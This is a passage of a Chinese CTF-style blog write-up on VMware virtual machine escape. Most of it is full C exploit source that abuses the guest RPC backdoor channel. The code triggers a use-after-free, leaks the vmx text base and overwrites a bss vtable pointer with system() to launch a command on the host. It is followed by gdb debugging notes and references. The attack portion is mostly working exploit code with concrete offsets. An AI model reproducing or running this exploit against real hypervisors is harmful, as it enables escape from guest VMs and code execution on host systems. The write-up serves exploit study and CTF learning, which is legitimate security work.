class="hljs-type">int</span> *res)</span>&#123;<br>    <span class="hljs-keyword">asm</span>(<span class="hljs-string">&quot;movl %%eax,%%ebx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movq %%rcx,%%r10\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x564d5868,%%eax\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl $0x0006001e,%%ecx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movw $0x5658,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;out %%eax,%%dx\n\t&quot;</span><br>        <span class="hljs-string">&quot;movl %%ecx,(%%r10)\n\t&quot;</span><br>        :<br>        :<br>        :<span class="hljs-string">&quot;%rax&quot;</span>,<span class="hljs-string">&quot;%rbx&quot;</span>,<span class="hljs-string">&quot;%rcx&quot;</span>,<span class="hljs-string">&quot;%rdx&quot;</span>,<span class="hljs-string">&quot;%rsi&quot;</span>,<span class="hljs-string">&quot;%rdi&quot;</span>,<span class="hljs-string">&quot;%r10&quot;</span><br>       );<br>&#125;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">channel</span>&#123;</span><br>    <span class="hljs-type">int</span> cookie1;<br>    <span class="hljs-type">int</span> cookie2;<br>    <span class="hljs-type">int</span> num;<br>&#125;;<br><span class="hljs-type">uint64_t</span> heap =<span class="hljs-number">0</span>;<br><span class="hljs-type">uint64_t</span> text =<span class="hljs-number">0</span>;<br><span class="hljs-type">void</span> <span class="hljs-title function_">run_cmd</span><span class="hljs-params">(<span class="hljs-type">char</span> *cmd)</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">channel</span> <span class="hljs-title">tmp</span>;</span><br>    <span class="hljs-type">int</span> res,len,i;<br>    <span class="hljs-type">char</span> *data;<br>    channel_open(&amp;tmp.cookie1,&amp;tmp.cookie2,&amp;tmp.num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(tmp.cookie1,tmp.cookie2,tmp.num,<span class="hljs-built_in">strlen</span>(cmd),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_send_data(tmp.cookie1,tmp.cookie2,tmp.num,<span class="hljs-built_in">strlen</span>(cmd)+<span class="hljs-number">0x10</span>,cmd,&amp;res);<br><br>    channel_recv_reply_len(tmp.cookie1,tmp.cookie2,tmp.num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv len:%d\n&quot;</span>,len);<br>    data = <span class="hljs-built_in">malloc</span>(len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(data,<span class="hljs-number">0</span>,len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len+<span class="hljs-number">0x10</span>;i+=<span class="hljs-number">4</span>)&#123;<br>        channel_recv_data(tmp.cookie1,tmp.cookie2,tmp.num,i,data,&amp;res);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv data:%s\n&quot;</span>,data);<br>    channel_recv_finish(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv finish\n&quot;</span>);<br>    &#125;<br><br>    channel_close(tmp.cookie1,tmp.cookie2,tmp.num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to close channel\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">leak</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">channel</span> <span class="hljs-title">chan</span>[10];</span><br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> len,i;  <br>    <span class="hljs-type">char</span> pay[<span class="hljs-number">8192</span>];<br>    <span class="hljs-type">char</span> *s1 = <span class="hljs-string">&quot;info-set guestinfo.a AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>    <span class="hljs-type">char</span> *data;<br>    <span class="hljs-type">char</span> *s2 = <span class="hljs-string">&quot;info-get guestinfo.a&quot;</span>;<br>    <span class="hljs-type">char</span> *s3 = <span class="hljs-string">&quot;1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&quot;</span>;<br>    <span class="hljs-type">char</span> *s4 = <span class="hljs-string">&quot;tools.capability.dnd_version 4&quot;</span>;<br>    <span class="hljs-type">char</span> *s5 = <span class="hljs-string">&quot;vmx.capability.dnd_version&quot;</span>;<br>    <span class="hljs-comment">//init data</span><br>    run_cmd(s1); <span class="hljs-comment">// set the message len to be 0x100, so when we call info-get ,we will call malloc(0x100);</span><br>    run_cmd(s4);<br><br>    <span class="hljs-comment">//first step </span><br>    channel_open(&amp;chan[<span class="hljs-number">0</span>].cookie1,&amp;chan[<span class="hljs-number">0</span>].cookie2,&amp;chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,<span class="hljs-built_in">strlen</span>(s2),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_send_data(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,<span class="hljs-built_in">strlen</span>(s2),s2,&amp;res);<br>    channel_recv_reply_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv len:%d\n&quot;</span>,len);<br>    data = <span class="hljs-built_in">malloc</span>(len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(data,<span class="hljs-number">0</span>,len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len+<span class="hljs-number">0x10</span>;i++)&#123;<br>        channel_recv_data(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,i,data,&amp;res);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv data:%s\n&quot;</span>,data);<br>    <span class="hljs-comment">//second step free the reply and let the other channel get it.</span><br><br>    channel_open(&amp;chan[<span class="hljs-number">1</span>].cookie1,&amp;chan[<span class="hljs-number">1</span>].cookie2,&amp;chan[<span class="hljs-number">1</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,<span class="hljs-built_in">strlen</span>(s2),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    channel_send_data(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,<span class="hljs-built_in">strlen</span>(s2)<span class="hljs-number">-4</span>,s2,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to send data\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//free the output buffer</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Freeing the buffer....,bp:0x5555556DD3EF\n&quot;</span>);<br>    getchar();<br>    channel_recv_finish2(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv finish1\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">//finished sending the command, should get the freed buffer</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Finishing sending the buffer , should allocate the buffer..,bp:0x5555556DD5BC\n&quot;</span>);<br>    getchar();<br>    channel_send_data(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,<span class="hljs-number">4</span>,&amp;s2[<span class="hljs-number">16</span>],&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to send data\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-comment">//third step,free it again</span><br>    <span class="hljs-comment">//set status to be 4</span><br>    channel_recv_reply_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv len:%d\n&quot;</span>,len);<br><br>    <span class="hljs-comment">//free the output buffer</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Free the buffer again...\n&quot;</span>);<br>    getchar();<br>    channel_recv_finish2(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv finish2\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Trying to reuse the buffer as a struct, which we can leak..\n&quot;</span>);<br>    getchar();<br>    run_cmd(s5);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Should be done.Check the buffer\n&quot;</span>);<br>    getchar();<br><br>    <span class="hljs-comment">//Now the output buffer of chan[1] is used as a struct, which contains many addresses</span><br>    channel_recv_reply_len(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>    data = <span class="hljs-built_in">malloc</span>(len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(data,<span class="hljs-number">0</span>,len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len+<span class="hljs-number">0x10</span>;i+=<span class="hljs-number">4</span>)&#123;<br>        channel_recv_data(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,i,data,&amp;res);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv data:\n&quot;</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len;i+=<span class="hljs-number">8</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv data:%lx\n&quot;</span>,*(<span class="hljs-type">long</span> <span class="hljs-type">long</span> *)&amp;data[i]);<br>    &#125;<br>    text = (*(<span class="hljs-type">uint64_t</span> *)data)<span class="hljs-number">-0xf818d0</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Leak Success\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">exploit</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-comment">//the exploit step is almost the same as the leak ones</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">channel</span> <span class="hljs-title">chan</span>[10];</span><br>    <span class="hljs-type">int</span> res=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> len,i;<br>    <span class="hljs-type">char</span> *data;<br>    <span class="hljs-type">char</span> *s1 = <span class="hljs-string">&quot;info-set guestinfo.b BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span>;<br>    <span class="hljs-type">char</span> *s2 = <span class="hljs-string">&quot;info-get guestinfo.b&quot;</span>;<br>    <span class="hljs-type">char</span> *s3 = <span class="hljs-string">&quot;1 BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB&quot;</span>;<br>    <span class="hljs-type">char</span> *s4 = <span class="hljs-string">&quot;gnome-calculator\x00&quot;</span>;<br>    <span class="hljs-type">uint64_t</span> pay1 =text+<span class="hljs-number">0xFE95B8</span>; <br>    <span class="hljs-type">uint64_t</span> pay2 =text+<span class="hljs-number">0xECFD0</span>; <span class="hljs-comment">//system</span><br>    <span class="hljs-type">uint64_t</span> pay3 =text+<span class="hljs-number">0xFE95C8</span>;<br>    <span class="hljs-type">char</span> *pay4 = <span class="hljs-string">&quot;gnome-calculator\x00&quot;</span>;<br>    run_cmd(s1);<br>    channel_open(&amp;chan[<span class="hljs-number">0</span>].cookie1,&amp;chan[<span class="hljs-number">0</span>].cookie2,&amp;chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,<span class="hljs-built_in">strlen</span>(s2),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_send_data(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,<span class="hljs-built_in">strlen</span>(s2),s2,&amp;res);<br>    channel_recv_reply_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv len:%d\n&quot;</span>,len);<br>    data = <span class="hljs-built_in">malloc</span>(len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-built_in">memset</span>(data,<span class="hljs-number">0</span>,len+<span class="hljs-number">0x10</span>);<br>    <span class="hljs-keyword">for</span>(i=<span class="hljs-number">0</span>;i&lt;len+<span class="hljs-number">0x10</span>;i+=<span class="hljs-number">4</span>)&#123;<br>        channel_recv_data(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,i,data,&amp;res);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;recv data:%s\n&quot;</span>,data);<br>    channel_open(&amp;chan[<span class="hljs-number">1</span>].cookie1,&amp;chan[<span class="hljs-number">1</span>].cookie2,&amp;chan[<span class="hljs-number">1</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_open(&amp;chan[<span class="hljs-number">2</span>].cookie1,&amp;chan[<span class="hljs-number">2</span>].cookie2,&amp;chan[<span class="hljs-number">2</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_open(&amp;chan[<span class="hljs-number">3</span>].cookie1,&amp;chan[<span class="hljs-number">3</span>].cookie2,&amp;chan[<span class="hljs-number">3</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to open channel!\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_recv_finish2(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv finish2\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,<span class="hljs-built_in">strlen</span>(s3),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;leak2 success\n&quot;</span>);<br>    channel_recv_reply_len(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;len,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv data len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_recv_finish2(chan[<span class="hljs-number">0</span>].cookie1,chan[<span class="hljs-number">0</span>].cookie2,chan[<span class="hljs-number">0</span>].num,&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to recv finish2\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_send_data(chan[<span class="hljs-number">1</span>].cookie1,chan[<span class="hljs-number">1</span>].cookie2,chan[<span class="hljs-number">1</span>].num,<span class="hljs-number">8</span>,&amp;pay1,&amp;res);<br>    channel_set_len(chan[<span class="hljs-number">2</span>].cookie1,chan[<span class="hljs-number">2</span>].cookie2,chan[<span class="hljs-number">2</span>].num,<span class="hljs-built_in">strlen</span>(s3),&amp;res);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>    channel_set_len(chan[<span class="hljs-number">3</span>].cookie1,chan[<span class="hljs-number">3</span>].cookie2,chan[<span class="hljs-number">3</span>].num,<span class="hljs-built_in">strlen</span>(s3),&amp;res);<br>    channel_send_data(chan[<span class="hljs-number">3</span>].cookie1,chan[<span class="hljs-number">3</span>].cookie2,chan[<span class="hljs-number">3</span>].num,<span class="hljs-number">8</span>,&amp;pay2,&amp;res);<br>    channel_send_data(chan[<span class="hljs-number">3</span>].cookie1,chan[<span class="hljs-number">3</span>].cookie2,chan[<span class="hljs-number">3</span>].num,<span class="hljs-number">8</span>,&amp;pay3,&amp;res);<br>    channel_send_data(chan[<span class="hljs-number">3</span>].cookie1,chan[<span class="hljs-number">3</span>].cookie2,chan[<span class="hljs-number">3</span>].num,<span class="hljs-built_in">strlen</span>(pay4)+<span class="hljs-number">1</span>,pay4,&amp;res);<br>    run_cmd(s4);<br>    <span class="hljs-keyword">if</span>(!res)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;fail to set len\n&quot;</span>);<br>        <span class="hljs-keyword">return</span>;<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    setvbuf(<span class="hljs-built_in">stdout</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stderr</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    setvbuf(<span class="hljs-built_in">stdin</span>,<span class="hljs-number">0</span>,<span class="hljs-number">2</span>,<span class="hljs-number">0</span>);<br>    leak();<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;text base :%p&quot;</span>,text);<br>    exploit();<br>&#125;   <br></code></pre></td></tr></table></figure>
+
+<p>其中修改了长亭师傅的一个魔数，目的是达到no enhanced。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8b5cc9e9d5519e804249233cc339cad6311cbed7.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>其中构造的exploit如下。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-62745268f78c644e67b21e14deae7cda0e266705.png" srcset="/img/loading.gif" lazyload alt="图片.png"><br> 开启四个channel</p>
+<p>然后free（0）</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-00e8aa2fa4011e8f00639154c8b15f85401f4144.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>set之后再次free(0)</p>
+<p>此时往channel 1 可以写入bss段的地址。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-1f029b2200ee309814087c541c99b32c5e947019.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>此时fd被链接进去之后可以直接malloc出来然后改写即可。</p>
+<p>此处覆盖的位置为bss段的一处调用</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-f0b3c90d5cbd2ef6d9dc12653e0de4722512a24b.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>可以看出来这块的虚表调用位置在FE95B0，+8即为FE95B8，所以此处改为system然后第一个参数（FE95C0）改为，弹出计算器的指令即可。</p>
+<h3 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h3><p>打开环境，ssh链接guest，然后sudo gdb .&#x2F;vmx -q，使用ps -aux | grep vmx找到对应的进程，attach上去，在ssh端口运行exp即可（记得先打断点，我断在了漏洞函数free的地方，方便看chunk）</p>
+<p>第一次free前</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-406d37c691e6e5004ec90acb50ec506407d0b61b.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-a8120d076ec4a58750eae4727ea33c426a91e60b.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>直接按了continue。。堆分配特别乱，于是重新来过。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-ec9d59dfbc0332422eecfd0c0d60b445d286bc22.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>断点找出漏洞函数。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-8d71666bf6ee066a3c9f34c2a562979dee1b3712.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>这是bufA的地址。记住0x7f35000210f0（user开头区域）</p>
+<p>经过UAF之后，这里把虚表写入bufB，</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-cff1a526e7d67d1e98b8cef0b48deda4cc636949.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>成功。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-71e566d153b0ff7626917e269648509ed147bf23.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<p>查看后发现确实是vtable。</p>
+<p>基址就可以leak出来了。后面是基本的劫持fd操作，不调试了，直接看到弹出计算器。</p>
+<p><img src="https://shs3.b.qianxin.com/attack_forum/2022/06/attach-fe93a41ccc7f68586129dd5cb19d8944c5f17d54.png" srcset="/img/loading.gif" lazyload alt="图片.png"></p>
+<h2 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h2><p><a target="_blank" rel="noopener" href="http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml">http://sysprogs.com/legacy/articles/kdvmware/guestrpc.shtml</a></p>
+<p><a target="_blank" rel="noopener" href="https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib">https://github.com/vmware/open-vm-tools/tree/master/open-vm-tools/lib</a></p>
+<p><a target="_blank" rel="noopener" href="https://sites.google.com/site/chitchatvmback/backdoor">https://sites.google.com/site/chitchatvmback/backdoor</a></p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/27733895">https://zhuanlan.zhihu.com/p/27733895</a></p>
+<p><a target="_blank" rel="noopener" href="https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html">https://nafod.net/blog/2019/12/21/station-escape-vmware-pwn.html</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/CTF/">#CTF</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>虚拟机逃逸（一）</div>
+      <div>http://example.com/2022/06/22/虚拟机逃逸（一）/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
